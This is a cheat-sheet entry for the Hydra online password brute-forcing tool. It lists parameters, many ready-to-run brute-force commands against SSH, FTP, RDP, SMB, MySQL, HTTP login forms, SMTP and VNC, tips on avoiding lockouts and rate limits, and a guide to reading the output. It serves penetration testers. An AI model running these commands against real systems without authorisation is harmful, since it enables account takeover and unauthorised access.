# Hydra

- **Category**: Password Attacks / Online Password Brute-Force
- **Risk Level**: 🔴 High

---

## Description

A multi-threaded online password brute-forcing tool supporting 50+ protocols; the go-to choice for online brute-forcing in penetration testing. Supports SSH, FTP, HTTP forms, RDP, SMB, MySQL, SMTP, and virtually all common authentication protocols.

## Installation

```bash
sudo apt install hydra
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-l USER` | Login with LOGIN name (or -L FILE for multiple) |
| `-L FILE` | Username list file |
| `-p PASS` | Try password PASS (or -P FILE for multiple) |
| `-P FILE` | Password list file |
| `-C FILE` | Colon-separated "login:pass" format, instead of -L/-P |
| `-t N` | Run TASKS connects in parallel per target (default: 16) |
| `-T N` | Run TASKS connects in parallel overall (for -M, default: 64) |
| `-s PORT` | If service is on a different default port, define it here |
| `-f` | Exit when a login/pass pair is found (-M: -f per host, -F global) |
| `-F` | Stop all after finding any valid password |
| `-v / -V` | Verbose mode / show login+pass for each attempt |
| `-o FILE` | Write found login/password pairs to FILE instead of stdout |
| `-e nsr` | Try "n" null password, "s" login as pass, "r" reversed login |
| `-I` | Ignore an existing restore file (don't wait 10 seconds) |
| `-w N` | Wait time for a response (default: 32) |
| `-W N` | Wait time between connects per thread (seconds) |

## Common Commands

```bash
# SSH brute-force (single user)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# SSH brute-force (multiple users)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4

# FTP brute-force
hydra -l admin -P wordlist.txt ftp://192.168.1.100

# RDP brute-force
hydra -l administrator -P wordlist.txt rdp://192.168.1.100

# SMB brute-force
hydra -l administrator -P wordlist.txt smb://192.168.1.100

# MySQL brute-force
hydra -l root -P wordlist.txt mysql://192.168.1.100

# HTTP GET Basic Auth
hydra -l admin -P wordlist.txt http-get://target.com/admin/

# HTTP POST form brute-force (most important!)
hydra -l admin -P wordlist.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
# Format: "/path:POST_body:failure_string"
# ⚠️ The failure string must match text in the FAILED login response body
# Use Burp Suite or curl to confirm the exact failure message before running

# HTTPS form brute-force
hydra -l admin -P wordlist.txt target.com https-post-form \
  "/login:user=^USER^&pass=^PASS^:Login failed"

# Brute-force with cookies (H=Cookie is the correct syntax for custom headers)
hydra -l admin -P wordlist.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid:H=Cookie: csrf=abc123"

# Rate-limited to prevent account lockout (important!)
hydra -l admin -P wordlist.txt ssh://192.168.1.100 -t 1 -W 5

# Save results
hydra -l root -P wordlist.txt ssh://192.168.1.100 -o /tmp/hydra_results.txt

# Brute-force from combo file
hydra -C /usr/share/wordlists/metasploit/http_default_pass.txt http-get://192.168.1.100/

# SMTP brute-force
hydra -l user@target.com -P wordlist.txt smtp://mail.target.com

# VNC brute-force (password only)
hydra -P wordlist.txt vnc://192.168.1.100
```

## Notes & Tips

1. Use `enum4linux` to check the password policy (account lockout threshold) before brute-forcing.
2. `-t 1 -W 5` significantly reduces account lockout risk — always rate-limit in production environments.
3. HTTP form brute-forcing requires correctly identifying the failure indicator — use Burp Suite to capture and confirm the exact failure message.
4. Some services (e.g., SSH) have built-in rate limiting — keep `-t` low (4 or fewer) to avoid triggering it.
5. For RDP targets, use `crowbar` instead — hydra's RDP support is unreliable; crowbar is purpose-built for it.
6. Output interpretation: `[<port>][<proto>] host: <ip> login: <user> password: <pass>` means valid credentials found — record immediately and test across other services in scope. `[ERROR] target does not support password authentication` means the service disabled password auth (e.g., SSH key-only) — try key-based auth or move to another service. `[STATUS] <n> attempts completed` with no successes means the dictionary is exhausted — try another wordlist or switch to rule-based attack. `[WARNING] target is limiting connections` means rate limiting was triggered — reduce `-t` to 1 and increase `-W` to 5+ seconds. `[ERROR] could not connect to target` with all attempts failing indicates a network issue or service down — check reachability with `ping` and `nc`.

---

## Official References

- [THC-Hydra (GitHub)](https://github.com/vanhauser-thc/thc-hydra)
